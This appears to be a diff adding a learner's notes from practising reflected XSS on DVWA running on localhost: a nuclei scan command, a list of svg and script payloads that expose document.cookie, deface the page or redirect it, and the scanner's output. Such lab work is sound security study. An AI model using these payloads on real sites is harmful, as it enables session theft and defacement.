@@ -1,0 +1,47 @@
+nuclei -u "http://localhost:4280/vulnerabilities/xss_r/?name=test" \
+  -H "Cookie: PHPSESSID=6c7b8b4a057b61ba87813cd859b8059b; security=low" \
+  -tags xss \
+  -severity high,critical
+
+
+
+
+
+
+
+
+khai thac:
+
+<svg onload=alert('XSS!')>
+
+<svg onload=alert('Ban_Da_Bi_Hack!!')>
+
+<svg onload=alert(document.cookie)>
+
+<svg onload=document.body.innerHTML='<h1>Website bi hack!</h1>'>
+<svg onload=window.location='https://google.com'>
+
+
+
+
+<script>alert('XSS!')</script>
+<script>alert(document.cookie)</script>
+<script>document.body.innerHTML='<h1>Website bi hack!</h1>'</script>
+<script>window.location='https://google.com'</script>
+
+
+
+
+
+
+[INF] Current nuclei version: v3.8.0 (latest)
+[INF] Current nuclei-templates version: v10.4.4 (latest)
+[INF] New templates added in latest release: 179
+[INF] Templates loaded for current scan: 1183
+[INF] Executing 1183 signed templates from projectdiscovery/nuclei-templates
+[INF] Targets loaded for current scan: 1
+[INF] Templates clustered: 10 (Reduced 6 Requests)
+[INF] Using Interactsh Server: oast.online
+[xss-fuzz] [http] [medium] http://localhost:4280/vulnerabilities/xss_r/?name=test&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-name%27%29%3E&json=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-json%27%29%3E&id_base=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-id_base%27%29%3E&where=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-where%27%29%3E&request=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-request%27%29%3E&notes=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-notes%27%29%3E&img=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-img%27%29%3E&a=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-a%27%29%3E&menu-item=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-menu-item%27%29%3E&xml=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-xml%27%29%3E&columns=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-columns%27%29%3E&service=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-service%27%29%3E&site_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site_id%27%29%3E [xss_param="name=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-name%27%29%3E&json=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-json%27%29%3E&id_base=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-id_base%27%29%3E&where=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-where%27%29%3E&request=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-request%27%29%3E&notes=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-notes%27%29%3E&img=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-img%27%29%3E&a=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-a%27%29%3E&menu-item=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-menu-item%27%29%3E&xml=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-xml%27%29%3E&columns=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-columns%27%29%3E&service=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-service%27%29%3E&site_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site_id%27%29%3E"]                                 
+[top-xss-params] [http] [high] http://localhost:4280/vulnerabilities/xss_r/?name=test&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27name%27%29%3E&q=%27%3E%22%3Csvg%2Fonload=confirm%28%27q%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27s%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27search%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27id%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27action%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27keyword%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27query%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27page%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27keywords%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27url%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27view%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27cat%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27key%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27p%27%29%3E
+[INF] Scan completed in 15.753544336s. 2 matches found.
